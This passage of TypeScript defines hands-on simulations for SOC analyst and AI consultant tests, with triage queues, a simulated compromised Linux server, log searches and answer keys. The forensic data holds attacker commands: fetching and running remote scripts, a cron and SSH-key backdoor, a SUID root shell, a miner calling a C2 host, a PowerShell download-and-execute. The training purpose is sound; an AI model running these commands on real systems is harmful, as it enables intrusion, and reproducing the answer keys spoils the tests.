import { short } from '../questionKit';
import { labApp, queueApp, simTask, terminalApp } from './simKit';
import type { TestSim } from './simsTech';

// Hands-on simulations for the SOC analyst and AI consultant tests: queues of alerts, emails, sign-ins, evidence,
// proposals and use cases to work through, a Linux server to investigate, and an ROI model.

// Rows are [number, first column, second column, detail]; with no prefix the first column is the record's id (F1, A1…)
const r = (rows: string[][], prefix: string) => rows.map(([id, a, b, detail]) => ({ id: prefix ? `${prefix}${id}` : a, cells: [a, b], detail }));

export const OPS_SIMS: Record<string, TestSim> = {
  // ---------- SOC ----------
  'test-net-01': {
    aspect: { id: 'sim', name: 'Hands-on: Traffic Review', summary: 'Judging real connections and choosing the response.' },
    questions: [
      simTask(
        'm-sim-nt-1',
        'Review Last Night’s Traffic',
        'Eight connections the network monitor flagged overnight. Open each, decide what it is, and choose the action.',
        'Network monitor: overnight flags',
        queueApp({
          title: 'Network monitor',
          subtitle: 'Northwind · overnight · 8 flagged flows',
          columns: ['Flow', 'Summary'],
          records: r(
            [
              ['1', 'F1', '45.143.200.11 → web01 ports 21–3389', 'src 45.143.200.11 (on public scanner lists)\ndst web01:21,22,23,25,80,110,143,443,445,3389 within 4 s\nAll DENY except 443 ALLOW (normal web traffic)'],
              ['2', 'F2', 'FIN-PC-07 → 91.215.85.12:443', 'Every 60 s ±1 s from 22:00 to 06:00, 600–900 bytes each way\nDomain: cdn-update-check.top (registered 4 days ago)\nUser logged off at 18:10'],
              ['3', 'F3', 'HR-LT-14 → 10.0.3.0/24 :445', '212 connections to other workstations on SMB in 30 minutes\nWorkstations normally only talk SMB to file servers'],
              ['4', 'F4', 'BACKUP01 → backup.vendor.com:443', '3.8 TB between 01:00 and 04:00, every night this month\nDestination is the contracted backup provider'],
              ['5', 'F5', 'DEV-LT-03 → files.mega.nz:443', '6.2 GB upload at 02:40 by rclone.exe\nUser on leave this week'],
              ['6', 'F6', 'All laptops → 8.8.8.8:53', 'DNS queries for ordinary sites; volume normal'],
              ['7', 'F7', 'PRINT01 → 10.0.0.5:389', 'LDAP lookups to the domain controller, small, hourly'],
              ['8', 'F8', 'SALES-LT-09 → many *.a8f3.top', '2,900 DNS queries in 5 minutes, each a long random-looking subdomain'],
            ],
            ''
          ),
          recordFields: [
            { key: 'verdict', label: 'What it is', type: 'select', options: ['Normal', 'Scan (blocked)', 'Beaconing (C2)', 'Lateral movement', 'Data exfiltration', 'DNS tunnelling'] },
            { key: 'action', label: 'Action', type: 'select', options: ['None', 'Block the IP and note it', 'Isolate the host and escalate'] },
          ],
        }),
        [
          ['F1 is a blocked scan', 'records.F1.verdict', 'Scan (blocked)'],
          ['F2 is beaconing', 'records.F2.verdict', 'Beaconing (C2)'],
          ['F2: isolate and escalate', 'records.F2.action', 'Isolate the host and escalate'],
          ['F3 is lateral movement', 'records.F3.verdict', 'Lateral movement'],
          ['F4 is the normal backup', 'records.F4.verdict', 'Normal'],
          ['F5 is exfiltration', 'records.F5.verdict', 'Data exfiltration'],
          ['F7 is normal', 'records.F7.verdict', 'Normal'],
          ['F8 is DNS tunnelling', 'records.F8.verdict', 'DNS tunnelling'],
        ],
        { minutes: 10 }
      ),
      short('m-sim-nt-2', 'The Tell', 'For F2, what one feature of the traffic most gives it away? (A few words.)', ['regular timing', 'every 60 seconds', 'regular intervals', 'fixed interval', 'the timing', 'periodic'], { taskId: 'm-sim-nt-1', minutes: 2 }),
    ],
  },

  'test-os-01': {
    aspect: { id: 'sim', name: 'Hands-on: Investigate web01', summary: 'Finding what an attacker left on a Linux server.' },
    questions: [
      simTask(
        'm-sim-os-1',
        'Investigate the Server',
        `web01 alerted for a brute-force attack last night. You have a read-only shell. Find out which account was taken over, from where, what the attacker left running, and how they kept access. Record your findings on the right.`,
        'Terminal: web01',
        terminalApp({
          title: 'Terminal',
          subtitle: 'web01 · read-only investigation shell',
          promptLabel: 'analyst@web01:~$',
          intro: 'Connected to web01 (read-only). Type help for commands.',
          world: {
            files: {
              '/var/log/auth.log':
                'Nov  4 02:11:03 sshd: Failed password for root from 103.44.8.9\nNov  4 02:11:04 sshd: Failed password for admin from 103.44.8.9\n... 1,180 more failures from 103.44.8.9 ...\nNov  4 02:31:47 sshd: Accepted password for deploy from 103.44.8.9 port 61002\nNov  4 02:32:10 sudo: deploy : COMMAND=/usr/bin/wget http://103.44.8.9/k.sh -O /tmp/.x/k.sh\nNov  4 08:01:12 sshd: Accepted publickey for ops from 10.0.1.5',
              '/home/deploy/.bash_history': 'cd /tmp\nmkdir .x\nwget http://103.44.8.9/k.sh -O /tmp/.x/k.sh\nchmod +x /tmp/.x/k.sh\n(crontab -l; echo "* * * * * /tmp/.x/k.sh") | crontab -\necho ssh-ed25519 AAAAC3...x9 kali >> ~/.ssh/authorized_keys\ncp /bin/bash /tmp/.x/bash; sudo chmod u+s /tmp/.x/bash\nhistory -c',
              '/home/deploy/.ssh/authorized_keys': 'ssh-ed25519 AAAAC3...a1 deploy@ci\nssh-ed25519 AAAAC3...x9 kali',
              '/tmp/.x/k.sh': '#!/bin/sh\npgrep kworkerd || /tmp/.x/kworkerd -o 91.215.85.12:4444 -B',
              '/etc/passwd': 'root:x:0:0::/root:/bin/bash\ndeploy:x:1001:1001::/home/deploy:/bin/bash\nops:x:1002:1002::/home/ops:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin',
            },
            dirs: { '/tmp': ['.x', 'systemd-private-a1'], '/tmp/.x': ['k.sh', 'kworkerd', 'bash'], '/home/deploy': ['.bash_history', '.ssh'], '/home/deploy/.ssh': ['authorized_keys'], '/var/log': ['auth.log', 'syslog'], '/etc': ['passwd', 'crontab'] },
            ps: 'USER     PID  %CPU COMMAND\nroot       1   0.0 /sbin/init\nwww-data 812   0.4 nginx: worker process\ndeploy  4411  98.7 /tmp/.x/kworkerd -o 91.215.85.12:4444 -B\nroot     901   0.0 /usr/sbin/sshd',
            crons: { deploy: '* * * * * /tmp/.x/k.sh', root: '0 3 * * * /usr/local/bin/backup.sh' },
            last: 'deploy   pts/0  103.44.8.9   Tue Nov  4 02:31   still logged in\nops      pts/1  10.0.1.5     Tue Nov  4 08:01 - 08:30',
            suid: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/su\n/tmp/.x/bash',
          },
          run: String.raw`
var W=world;
if(cmd==='help')return 'ls [-la] <dir> | cat <file> | grep <text> <file> | ps aux | crontab -l -u <user> | last | find / -perm -4000 | whoami | clear';
if(cmd==='whoami')return 'analyst';
if(cmd==='ls'){var d=args.filter(function(a){return a.charAt(0)!=='-'})[0]||'/home';d=d.replace(/\/$/,'');var l=W.dirs[d];if(!l)return "ls: cannot access '"+d+"': No such file or directory";var all=args.indexOf('-la')>=0||args.indexOf('-a')>=0;return l.filter(function(f){return all||f.charAt(0)!=='.'}).join('  ')||'(no visible files; try ls -la)';}
if(cmd==='cat'){var f=W.files[args[0]];return f==null?'cat: '+args[0]+': No such file or permission denied':f;}
if(cmd==='grep'){var f2=W.files[args[1]];if(f2==null)return 'grep: '+args[1]+': No such file';return f2.split('\n').filter(function(x){return x.toLowerCase().indexOf((args[0]||'').toLowerCase())>=0}).join('\n');}
if(cmd==='ps')return W.ps;
if(cmd==='crontab'){var u=args[args.indexOf('-u')+1];if(args.indexOf('-u')<0)return 'no crontab for analyst';return W.crons[u]||'no crontab for '+u;}
if(cmd==='last')return W.last;
if(cmd==='find'){if(args.join(' ').indexOf('4000')>=0)return W.suid;return 'find: try find / -perm -4000';}
return cmd+': command not found (type help)';`,
          answers: [
            { key: 'account', label: 'Account taken over', type: 'text' },
            { key: 'ip', label: 'Attacker’s IP', type: 'text' },
            { key: 'process', label: 'Malicious process name', type: 'text' },
            { key: 'c2', label: 'Address it connects to (ip:port)', type: 'text' },
            { key: 'cron', label: 'Persistence: a cron job', type: 'check' },
            { key: 'sshkey', label: 'Persistence: an added SSH key', type: 'check' },
            { key: 'suid', label: 'Persistence: a SUID root shell', type: 'check' },
            { key: 'newuser', label: 'Persistence: a new user account', type: 'check' },
          ],
        }),
        [
          ['Finds the account: deploy', 'answers.account', 'deploy'],
          ['Finds the attacker’s IP', 'answers.ip', '103.44.8.9'],
          ['Finds the miner process', 'answers.process', 'kworkerd|/tmp/.x/kworkerd'],
          ['Finds where it connects', 'answers.c2', '91.215.85.12:4444'],
          ['Finds the cron job', 'answers.cron', 'true'],
          ['Finds the SSH key', 'answers.sshkey', 'true'],
          ['Finds the SUID shell', 'answers.suid', 'true'],
          ['Doesn’t claim a new user', 'answers.newuser', 'false'],
        ],
        { minutes: 15 }
      ),
      short('m-sim-os-2', 'Hidden Tracks', 'What did the attacker run to try to hide their commands?', ['history -c', 'history clear', 'cleared history'], { taskId: 'm-sim-os-1', minutes: 2 }),
    ],
  },

  'test-logs-01': {
    aspect: { id: 'sim', name: 'Hands-on: SIEM Search', summary: 'Searching logs to answer what happened.' },
    questions: [
      simTask(
        'm-sim-lg-1',
        'Hunt Through the Logs',
        'Three detections fired this morning. Use the log search to investigate, give each a verdict, and answer the questions on the right.',
        'SIEM: Northwind',
        queueApp({
          title: 'SIEM',
          subtitle: 'Northwind · 06:00–07:30',
          columns: ['Detection', 'Summary'],
          records: r(
            [
              ['1', 'D1', 'Password spray: many accounts, one source', 'Rule: one source IP failing on 20+ accounts in an hour.'],
              ['2', 'D2', 'MFA push flood', 'Rule: 5+ MFA prompts to one user in 10 minutes.'],
              ['3', 'D3', 'Impossible travel: m.ali', 'Rule: sign-ins from two countries too far apart for the time between them.'],
            ],
            ''
          ),
          recordFields: [{ key: 'verdict', label: 'Verdict', type: 'select', options: ['True positive', 'False positive', 'Benign true positive'] }],
          search: {
            label: 'Log search',
            lines: [
              '06:02 signin FAIL user=a.baker ip=198.51.100.23 ua=python-requests',
              '06:02 signin FAIL user=b.chen ip=198.51.100.23 ua=python-requests',
              '06:03 signin FAIL user=c.diaz ip=198.51.100.23 ua=python-requests',
              '06:03 signin FAIL user=d.evans ip=198.51.100.23 ua=python-requests',
              '06:04 signin FAIL user=e.ford ip=198.51.100.23 ua=python-requests',
              '06:05 signin FAIL user=f.gray ip=198.51.100.23 ua=python-requests',
              '06:06 signin OK   user=k.owen ip=198.51.100.23 ua=python-requests mfa=required',
              '06:06 signin FAIL user=l.hart ip=198.51.100.23 ua=python-requests',
              '06:07 signin FAIL user=n.ito ip=198.51.100.23 ua=python-requests',
              '06:40 signin OK   user=m.ali ip=81.2.69.14 country=UK device=MA-LT-02 mfa=passed',
              '06:58 signin OK   user=m.ali ip=165.225.80.4 country=NL device=MA-LT-02 mfa=passed note=zscaler-egress',
              '07:10 mfa PUSH user=k.owen ip=198.51.100.23',
              '07:11 mfa PUSH user=k.owen ip=198.51.100.23',
              '07:12 mfa PUSH user=k.owen ip=198.51.100.23',
              '07:13 mfa DENY user=k.owen',
              '07:14 mfa PUSH user=k.owen ip=198.51.100.23',
              '07:15 mfa PUSH user=k.owen ip=198.51.100.23',
              '07:16 mfa APPROVE user=k.owen ip=198.51.100.23',
              '07:16 signin OK   user=k.owen ip=198.51.100.23 ua=python-requests mfa=passed',
              '07:19 mailbox NEW-RULE user=k.owen rule="move invoice|payment to RSS Feeds"',
              '07:22 mailbox SEND user=k.owen to=accounts@supplier-nw.com subject="Updated bank details"',
              '07:30 signin OK   user=j.smith ip=81.2.69.20 country=UK mfa=passed',
            ],
          },
          answers: [
            { key: 'ip', label: 'Attacker’s IP', type: 'text' },
            { key: 'user', label: 'Account compromised', type: 'text' },
            { key: 'pushes', label: 'MFA pushes sent before approval', type: 'number' },
            { key: 'firstIn', label: 'Time the attacker got in with MFA (hh:mm)', type: 'text' },
            { key: 'next', label: 'What the attacker did next', type: 'select', options: ['Nothing yet', 'Hid payment mail and emailed a supplier about bank details', 'Downloaded files from SharePoint'] },
          ],
        }),
        [
          ['D1 is a true positive', 'records.D1.verdict', 'True positive'],
          ['D2 is a true positive', 'records.D2.verdict', 'True positive'],
          ['D3 is benign (company proxy egress)', 'records.D3.verdict', 'Benign true positive|False positive'],
          ['Attacker IP', 'answers.ip', '198.51.100.23'],
          ['Compromised account', 'answers.user', 'k.owen'],
          ['Counts the pushes (5)', 'answers.pushes', '5'],
          ['Time they got in', 'answers.firstIn', '07:16|7:16'],
          ['What came next', 'answers.next', 'Hid payment mail and emailed a supplier about bank details'],
        ],
        { minutes: 15 }
      ),
      short('m-sim-lg-2', 'Your Search', 'Which value did you search for first to tie the detections together? (One value.)', ['198.51.100.23', 'k.owen', 'python-requests'], { taskId: 'm-sim-lg-1', minutes: 2 }),
    ],
  },

  'test-triage-01': {
    aspect: { id: 'sim', name: 'Hands-on: Alert Queue', summary: 'Working a morning queue to verdicts and priorities.' },
    questions: [
      simTask(
        'm-sim-tr-1',
        'Work the Queue',
        'Seven alerts with their enrichment. For each, give a verdict, a priority (P1 most urgent) and an action.',
        'SOC queue: Tuesday',
        queueApp({
          title: 'SOC queue',
          subtitle: 'Tuesday 08:00 · 7 alerts',
          columns: ['Alert', 'Title'],
          records: r(
            [
              ['1', 'A1', 'Credential dumping on IT-ADMIN-03', 'procdump64.exe -ma lsass.exe by r.singh (IT admin, on leave). No change booked.'],
              ['2', 'A2', 'Vulnerability scan from 10.0.9.9', '10.0.9.9 is the security team’s scanner; weekly scan is in the change calendar for now.'],
              ['3', 'A3', 'Phishing reported by p.nash', 'User reported an email; proxy shows no click; same email delivered to 40 people.'],
              ['4', 'A4', 'New domain admin at 02:14', '"svc_backup2" created and added to Domain Admins by helpdesk account hd.kim; no ticket.'],
              ['5', 'A5', 'Macro launched PowerShell on HR-LT-02', 'winword.exe → powershell -enc …; downloads from 185.244.25.7; user t.lowe.'],
              ['6', 'A6', 'Antivirus: adware on KIOSK-01', 'Toolbar adware quarantined automatically; kiosk has no logged-in users.'],
              ['7', 'A7', 'Impossible travel: d.cho', 'Leeds then Frankfurt in 8 minutes; Frankfurt IP is the company’s Zscaler egress; same device.'],
            ],
            ''
          ),
          recordFields: [
            { key: 'verdict', label: 'Verdict', type: 'select', options: ['True positive', 'False positive', 'Benign true positive'] },
            { key: 'priority', label: 'Priority', type: 'select', options: ['P1', 'P2', 'P3', 'P4'] },
            { key: 'action', label: 'Action', type: 'select', options: ['Close with notes', 'Investigate further', 'Contain and escalate now', 'Pull the email from all mailboxes'] },
          ],
        }),
        [
          ['A1: true positive', 'records.A1.verdict', 'True positive'],
          ['A1: contain and escalate', 'records.A1.action', 'Contain and escalate now'],
          ['A2: benign (approved scan)', 'records.A2.verdict', 'Benign true positive'],
          ['A3: pull the email everywhere', 'records.A3.action', 'Pull the email from all mailboxes'],
          ['A4: P1', 'records.A4.priority', 'P1'],
          ['A5: contain and escalate', 'records.A5.action', 'Contain and escalate now'],
          ['A6: close with notes', 'records.A6.action', 'Close with notes'],
          ['A7: benign (company proxy)', 'records.A7.verdict', 'Benign true positive|False positive'],
        ],
        { minutes: 12 }
      ),
      short('m-sim-tr-2', 'ATT&CK', 'Which ATT&CK tactic is A1?', ['credential access'], { taskId: 'm-sim-tr-1', minutes: 2 }),
    ],
  },

  'test-phish-01': {
    aspect: { id: 'sim', name: 'Hands-on: Reported Mail', summary: 'Judging reported emails from their headers and links.' },
    questions: [
      simTask(
        'm-sim-ph-1',
        'Clear the Reported Inbox',
        'Six emails staff reported this week. Open each, read the headers and links, and decide what it is and what to do.',
        'Reported mail inbox',
        queueApp({
          title: 'Reported mail',
          subtitle: 'phishing@northwind · 6 reports',
          columns: ['From', 'Subject'],
          records: r(
            [
              ['1', 'Microsoft 365 <no-reply@micros0ft-support.com>', 'Your mailbox will be deleted', 'Reply-To: helpdesk.m365@gmail.com\nAuth: spf=fail dkim=none dmarc=fail\nLink: https://login.micros0ft-support.com/verify'],
              ['2', 'DocuSign <dse@docusign.net>', 'Updated payment remittance', 'Auth: spf=pass dkim=pass dmarc=pass (docusign.net)\nSender in envelope: "J. Carter" (unknown)\nDocument link: https://northwind-sharepoint.webflow.io/remit'],
              ['3', 'Payroll <payroll@northwind.co.uk>', 'Your November payslip', 'Auth: spf=pass dkim=pass dmarc=pass (northwind.co.uk)\nSent from the HR system on the usual date\nLink: https://hr.northwind.co.uk/payslips'],
              ['4', 'Mega Deals <offers@deals-today.biz>', '80% off sunglasses!!!', 'Auth: spf=pass dkim=pass dmarc=none\nBulk marketing, unsubscribe link present, no login request'],
              ['5', 'Ana Silva <ana.silva@supplier-nw.com>', 'New bank details for invoices', 'Real supplier domain, DMARC pass; asks to pay future invoices to a new account; "urgent, CFO approved"'],
              ['6', 'IT Service Desk (QR)', 'Re-enable your MFA', 'From: it-desk@northwind-it.help\nAuth: spf=pass dmarc=pass (northwind-it.help)\nBody: an image of a QR code, no text links'],
            ],
            'E'
          ),
          recordFields: [
            { key: 'verdict', label: 'Verdict', type: 'select', options: ['Phishing', 'Legitimate', 'Spam', 'Suspected fraud: verify by phone'] },
            { key: 'action', label: 'Action', type: 'select', options: ['Remove all copies and block', 'Mark as safe', 'Move to junk', 'Call the supplier on the number on file'] },
          ],
        }),
        [
          ['E1 is phishing', 'records.E1.verdict', 'Phishing'],
          ['E2 is phishing despite passing DMARC', 'records.E2.verdict', 'Phishing'],
          ['E3 is legitimate', 'records.E3.verdict', 'Legitimate'],
          ['E4 is spam', 'records.E4.verdict', 'Spam'],
          ['E5: verify by phone', 'records.E5.action', 'Call the supplier on the number on file'],
          ['E6 is phishing (QR, lookalike domain)', 'records.E6.verdict', 'Phishing'],
          ['E6: remove and block', 'records.E6.action', 'Remove all copies and block'],
        ],
        { minutes: 10 }
      ),
      short('m-sim-ph-2', 'E6’s Domain', 'What is the sending domain of E6?', ['northwind-it.help'], { taskId: 'm-sim-ph-1', minutes: 2 }),
    ],
  },

  'test-ir-01': {
    aspect: { id: 'sim', name: 'Hands-on: Build the Timeline', summary: 'Ordering evidence and separating fact from assessment.' },
    questions: [
      simTask(
        'm-sim-ir-1',
        'Build the Incident Timeline',
        'Eight pieces of evidence from the ransomware incident at the accountancy firm. Put each in timeline order (1 = first) and mark whether it’s a confirmed fact or an assessment. Then fill in the key facts.',
        'Incident workbench',
        queueApp({
          title: 'Incident workbench',
          subtitle: 'INC-2041 · ransomware on FS01',
          columns: ['Evidence', 'Source'],
          records: r(
            [
              ['1', 'Encryption begins on FS01', 'EDR', 'Mon 07:50 — EDR shows mass file renames to .lkx on FS01.'],
              ['2', 'VPN login as t.ward, no MFA', 'VPN log', 'Fri 17:48 — 91.240.118.9 (Romania), legacy profile without MFA.'],
              ['3', '38 GB uploaded to mega.nz', 'Proxy log', 'Sat 02:40 — rclone.exe on FS01 → mega.nz, 38 GB.'],
              ['4', 'Password likely phished on Thursday', 'Analyst note', 'A phishing email reached t.ward on Thu; no proof he entered the password.'],
              ['5', 'RDP from VPN to FS01', 'FS01 event log', 'Sat 02:10 — 4624 logon type 10, t.ward from the VPN pool.'],
              ['6', 'EDR blocks the ransomware', 'EDR', 'Mon 08:19 — process killed; 14,200 files already encrypted.'],
              ['7', 'FS01 isolated', 'Network log', 'Mon 08:31 — switch port disabled.'],
              ['8', 'Restore from Sunday backup', 'Backup log', 'Mon 11:00 — restore from Sun 23:00 snapshot complete.'],
            ],
            'V'
          ),
          recordFields: [
            { key: 'order', label: 'Position in timeline (1–8)', type: 'number' },
            { key: 'kind', label: 'Kind', type: 'select', options: ['Confirmed fact', 'Assessment'] },
          ],
          answers: [
            { key: 'dwell', label: 'Dwell time before encryption began (hours, whole number)', type: 'number' },
            { key: 'access', label: 'Initial access', type: 'select', options: ['Phishing attachment', 'VPN login with a stolen password, no MFA', 'Exposed RDP to the internet'] },
            { key: 'reportable', label: 'Likely reportable to the ICO within 72 hours', type: 'check' },
          ],
          answersTitle: 'Key facts',
        }),
        [
          ['Phishing (Thu) comes first', 'records.V4.order', '1'],
          ['Then the VPN login', 'records.V2.order', '2'],
          ['Then RDP to FS01', 'records.V5.order', '3'],
          ['Then the upload', 'records.V3.order', '4'],
          ['Encryption 5th', 'records.V1.order', '5'],
          ['Restore last', 'records.V8.order', '8'],
          ['The phishing link is an assessment', 'records.V4.kind', 'Assessment'],
          ['The upload is a confirmed fact', 'records.V3.kind', 'Confirmed fact'],
          ['Dwell time 62 hours (Fri 17:48 → Mon 07:50)', 'answers.dwell', '62'],
          ['Initial access via VPN', 'answers.access', 'VPN login with a stolen password, no MFA'],
          ['Flags it as reportable', 'answers.reportable', 'true'],
        ],
        { minutes: 12 }
      ),
      short('m-sim-ir-2', 'One Sentence', 'In one sentence for the partners: what was taken?', ['38 gb of client files', 'client files', 'client data', '38gb of client data', 'client personal data'], { taskId: 'm-sim-ir-1', minutes: 2 }),
    ],
  },

  'test-idcloud-01': {
    aspect: { id: 'sim', name: 'Hands-on: CloudTrail Review', summary: 'Reading cloud audit events to find and contain a compromise.' },
    questions: [
      simTask(
        'm-sim-id-1',
        'Review the CloudTrail Events',
        'Eight events from prod-01’s CloudTrail overnight. Mark each benign or malicious, then answer the questions.',
        'CloudTrail: prod-01',
        queueApp({
          title: 'CloudTrail',
          subtitle: 'account prod-01 · 02:00–04:00',
          columns: ['Time', 'Event'],
          records: r(
            [
              ['1', '02:05', 'PutObject by backup-role', 'Nightly backup writes to s3://nw-backups. Same as every night.'],
              ['2', '03:12', 'ConsoleLogin by ci-deploy', 'src 185.191.171.4, MFA: No. ci-deploy is the CI pipeline user and has never logged in to the console.'],
              ['3', '03:14', 'CreateAccessKey for ci-deploy', 'By ci-deploy, from 185.191.171.4.'],
              ['4', '03:15', 'StopLogging on org-trail', 'By ci-deploy. Result: AccessDenied (SCP).'],
              ['5', '03:16', 'CreateUser backup-svc', 'By ci-deploy.'],
              ['6', '03:16', 'AttachUserPolicy AdministratorAccess', 'To backup-svc, by ci-deploy.'],
              ['7', '03:20', 'RunInstances x40 p4d.24xlarge', 'Region ap-southeast-3 (never used), by backup-svc.'],
              ['8', '03:40', 'AssumeRole by deploy-pipeline', 'From the CI runner’s usual IP, as on every deploy.'],
            ],
            'C'
          ),
          recordFields: [{ key: 'verdict', label: 'Verdict', type: 'select', options: ['Benign', 'Malicious'] }],
          answers: [
            { key: 'identity', label: 'First identity compromised', type: 'text' },
            { key: 'backdoor', label: 'Backdoor user created', type: 'text' },
            { key: 'first', label: 'First containment action', type: 'select', options: ['Terminate the instances', 'Disable ci-deploy’s console access and keys', 'Delete the trail', 'Email AWS'] },
          ],
        }),
        [
          ['C1 benign', 'records.C1.verdict', 'Benign'],
          ['C2 malicious', 'records.C2.verdict', 'Malicious'],
          ['C4 malicious (blocked attempt)', 'records.C4.verdict', 'Malicious'],
          ['C6 malicious', 'records.C6.verdict', 'Malicious'],
          ['C7 malicious', 'records.C7.verdict', 'Malicious'],
          ['C8 benign', 'records.C8.verdict', 'Benign'],
          ['Identity: ci-deploy', 'answers.identity', 'ci-deploy'],
          ['Backdoor: backup-svc', 'answers.backdoor', 'backup-svc'],
          ['First action: cut off ci-deploy', 'answers.first', 'Disable ci-deploy’s console access and keys'],
        ],
        { minutes: 10 }
      ),
      short('m-sim-id-2', 'What Saved You', 'What stopped the attacker from turning off logging?', ['the scp', 'scp', 'service control policy', 'an scp'], { taskId: 'm-sim-id-1', minutes: 2 }),
    ],
  },

  'test-sim-soc-01': {
    aspect: { id: 'sim', name: 'Hands-on: The Monday Queue', summary: 'Working the queue and logs to the real attack.' },
    questions: [
      simTask(
        'm-sim-socs-1',
        'Work Monday’s Queue',
        'Your Monday queue with the logs behind it. Triage every alert, search the logs, and record the facts of the real attack.',
        'SOC console: Monday',
        queueApp({
          title: 'SOC console',
          subtitle: 'Northwind · Monday 08:00',
          columns: ['Alert', 'Title'],
          records: r(
            [
              ['1', 'A1', 'Port scan blocked (45.143.200.11)', 'Low. Firewall DENY on 9 ports; IP on public scanner lists.'],
              ['2', 'A2', 'Phishing reported by m.ali', 'Medium. "Invoice overdue"; no click recorded.'],
              ['3', 'A3', 'Impossible travel: l.ford', 'Medium. Leeds 07:10, Amsterdam 07:25.'],
              ['4', 'A4', 'Suspicious PowerShell on FIN-PC-04', 'High. s.khan, 07:41.'],
              ['5', 'A5', '40 failed VPN logins for administrator', 'Low. From 103.75.44.2; none succeeded.'],
              ['6', 'A6', '2.1 GB upload from FIN-PC-04', 'Medium. To 172.67.9.88, 07:55.'],
            ],
            ''
          ),
          recordFields: [
            { key: 'verdict', label: 'Verdict', type: 'select', options: ['True positive', 'False positive', 'Benign true positive', 'Blocked attempt'] },
            { key: 'incident', label: 'Part of the main incident', type: 'check' },
          ],
          search: {
            label: 'Logs (EDR, proxy, sign-ins, mail)',
            lines: [
              '07:10 signin OK user=l.ford ip=81.2.69.30 city=Leeds device=LF-LT-01',
              '07:25 signin OK user=l.ford ip=165.225.80.4 city=Amsterdam device=LF-LT-01 note=zscaler-egress',
              '07:38 mail OPEN user=s.khan attachment=Remittance_Advice.html subject="Payment confirmation"',
              '07:39 proxy user=s.khan url=https://nw-sharepoint-login.pages.dev/signin',
              '07:40 signin OK user=s.khan ip=91.92.240.18 country=BG mfa=approved',
              '07:41 edr host=FIN-PC-04 proc=powershell.exe cmd="iwr https://91.92.240.18/a.ps1 | iex"',
              '07:44 edr host=FIN-PC-04 schtask create name="EdgeUpdateCore" cmd=C:\\ProgramData\\eu.exe',
              '07:52 edr host=FIN-PC-04 proc=eu.exe read=\\\\FS01\\Finance\\Payroll\\*.xlsx files=412',
              '07:55 proxy host=FIN-PC-04 proc=eu.exe dst=172.67.9.88:443 bytes_out=2.1GB',
              '08:02 mail RULE user=s.khan forward contains "payment" to nw-accounts@proton.me',
              '06:30 fw DENY src=45.143.200.11 dst=web01 ports=21,22,23,25,80,110,143,445,3389',
              '06:50 vpn FAIL user=administrator ip=103.75.44.2 count=40',
            ],
          },
          answers: [
            { key: 'user', label: 'Compromised user', type: 'text' },
            { key: 'attackerIp', label: 'Attacker’s IP', type: 'text' },
            { key: 'task', label: 'Persistence (scheduled task name)', type: 'text' },
            { key: 'files', label: 'Payroll files read', type: 'number' },
            { key: 'forward', label: 'Forwarding address set up', type: 'text' },
            { key: 'severity', label: 'Severity', type: 'select', options: ['Low', 'Medium', 'High', 'Critical'] },
          ],
          answersTitle: 'Incident facts',
        }),
        [
          ['A1 is a blocked attempt', 'records.A1.verdict', 'Blocked attempt'],
          ['A3 is benign (company proxy)', 'records.A3.verdict', 'Benign true positive|False positive'],
          ['A4 is a true positive', 'records.A4.verdict', 'True positive'],
          ['A4 is part of the incident', 'records.A4.incident', 'true'],
          ['A6 is part of the incident', 'records.A6.incident', 'true'],
          ['A5 is a blocked attempt', 'records.A5.verdict', 'Blocked attempt'],
          ['Compromised user: s.khan', 'answers.user', 's.khan'],
          ['Attacker IP', 'answers.attackerIp', '91.92.240.18'],
          ['Persistence task', 'answers.task', 'EdgeUpdateCore'],
          ['412 payroll files', 'answers.files', '412'],
          ['Forwarding address', 'answers.forward', 'nw-accounts@proton.me'],
          ['Critical', 'answers.severity', 'Critical'],
        ],
        { minutes: 18 }
      ),
      short('m-sim-socs-2', 'First Move', 'What is the very first containment action you take?', ['isolate fin-pc-04', 'isolate the host', 'isolate fin pc 04', 'isolate the pc', 'isolate the machine', "revoke s.khan's sessions"], { taskId: 'm-sim-socs-1', minutes: 2 }),
    ],
  },

  // ---------- AI consultant ----------
  'test-aitools-01': {
    aspect: { id: 'sim', name: 'Hands-on: Route the Requests', summary: 'Matching client needs to the cheapest route that works.' },
    questions: [
      simTask(
        'm-sim-at-1',
        'Advise on Six Requests',
        'A 60-person estate agency sent six AI requests. For each, choose the route and whether a person must review the output.',
        'Client requests: Hart & Co',
        queueApp({
          title: 'Client requests',
          subtitle: 'Hart & Co estate agents · 60 staff · Microsoft 365',
          columns: ['#', 'Request'],
          records: r(
            [
              ['1', '1', 'Meeting notes and actions', 'Partners want summaries of client meetings in Teams.'],
              ['2', '2', 'Property descriptions', 'Write listing descriptions from notes and photos; 120 a month.'],
              ['3', '3', 'Valuations', 'AI to set asking prices automatically and send them to sellers.'],
              ['4', '4', 'Call answering after hours', 'Missed calls about viewings after 6pm; their phone system offers an AI receptionist add-on.'],
              ['5', '5', 'Bespoke CRM model', 'Build their own AI model trained on all client emails.'],
              ['6', '6', 'Tenant screening', 'Automatically reject applicants below a score.'],
            ],
            'R'
          ),
          recordFields: [
            { key: 'route', label: 'Route', type: 'select', options: ['Use a feature of tools they have', 'Configure a business AI assistant', 'Buy a specialist add-on', 'Custom build', 'Don’t automate the decision'] },
            { key: 'review', label: 'A person reviews the output', type: 'check' },
          ],
        }),
        [
          ['1: a feature they already have', 'records.R1.route', 'Use a feature of tools they have'],
          ['2: a configured business assistant', 'records.R2.route', 'Configure a business AI assistant'],
          ['2: reviewed by a person', 'records.R2.review', 'true'],
          ['3: don’t automate valuations', 'records.R3.route', 'Don’t automate the decision'],
          ['4: buy the add-on', 'records.R4.route', 'Buy a specialist add-on'],
          ['5: not a custom build either; configure instead', 'records.R5.route', 'Configure a business AI assistant'],
          ['6: don’t automate rejections', 'records.R6.route', 'Don’t automate the decision'],
        ],
        { minutes: 10 }
      ),
      short('m-sim-at-2', 'Why Not Build?', 'In a few words, why not build their own model (request 5)?', ['too expensive', 'cost', 'not needed', 'unnecessary', 'too costly', 'overkill', 'off the shelf is enough'], { taskId: 'm-sim-at-1', minutes: 2 }),
    ],
  },

  'test-usecase-01': {
    aspect: { id: 'sim', name: 'Hands-on: Use-Case Board', summary: 'Sizing and deciding on discovered use cases.' },
    questions: [
      simTask(
        'm-sim-uc-1',
        'Decide the Shortlist',
        'Discovery notes from a 200-person housing association. Work out the hours for each use case and decide what happens to it.',
        'Use-case board: housing association',
        queueApp({
          title: 'Use-case board',
          subtitle: 'Riverside Homes · 200 staff · 6 candidates',
          columns: ['Use case', 'Volume'],
          records: r(
            [
